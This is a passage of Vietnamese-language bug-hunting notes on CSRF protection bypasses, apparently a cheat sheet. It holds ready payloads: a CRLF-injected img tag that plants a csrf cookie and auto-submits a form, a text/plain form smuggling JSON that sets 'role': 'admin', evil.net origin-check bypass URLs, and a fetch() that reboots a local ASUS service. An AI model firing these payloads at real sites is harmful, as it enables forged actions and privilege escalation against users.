## **7. CSRF Token Verified By Cookie**

```
App dùng double-submit cookie pattern:
Cookie: csrf=TOKEN123
Body:   csrf=TOKEN123

Lỗ hổng: Nếu có CRLF injection → Attacker set cookie cho victim

Attack:
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=ATTACKER_TOKEN"
     onerror="document.forms[0].submit();">

→ Image load → CRLF set cookie csrf=ATTACKER_TOKEN trên victim
→ Form submit với csrf=ATTACKER_TOKEN
→ Cookie match body → Server accept → CSRF thành công ❌
```

> ⚠️ **Không work nếu** CSRF token gắn với session cookie — vì sẽ tự tấn công chính mình.

---

## **8. Content-Type Change**

```
Preflight request bị trigger với:
❌ application/json
❌ application/xml

Không trigger preflight (có thể bypass):
✅ application/x-www-form-urlencoded
✅ multipart/form-data
✅ text/plain

Trick: Gửi JSON data dưới dạng text/plain
```

html

```html
<form method="post" action="https://target.com/api"
      enctype="text/plain">
  <input name='{"key":"' value='", "role": "admin"}' />
</form>
```

Kết quả body:

```
{"key":"", "role": "admin"}
```

→ Server parse như JSON dù Content-Type là text/plain!

---

## **9. Referrer/Origin Bypass**

###**Suppress Referrer header:**

html

```html
<meta name="referrer" content="never">
→ Browser không gửi Referer header
→ App chỉ check khi header CÓ MẶT → Bypass
```

**URL format bypass (Regex weakness):**

```
Target: example.com

Bypass URL starts with check:
http://example.com.evil.net
→ Starts with "example.com" → Regex match → Bypass

Bypass URL ends with check:
http://evil.net?orig=http://example.com
→ Ends with "example.com" → Regex match → Bypass
```

---

## **10. HEAD Method Bypass**

```
Một số routers xử lý HEAD như GET:

Nếu GET bị giới hạn/protected:
→ Gửi HEAD request
→ Router forward đến GET handler
→ Execute như GET nhưng không return body
→ CSRF protection bypass ❌
```

---

## **11. Browser-to-Localhost CSRF**

```
Không giới hạn hunt ở target origin!

Local services thường exposed:
- 127.0.0.1
- localhost
- 0.0.0.0
- RFC1918 addresses (192.168.x.x, 10.x.x.x)

Thường vulnerable vì:
→ Assume chỉ local user có thể reach
→ Không có CSRF token
→ Permissive Origin checks
→ Accept text/plain thay vì chỉ application/json

Ví dụ attack từ browser:
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
})
```
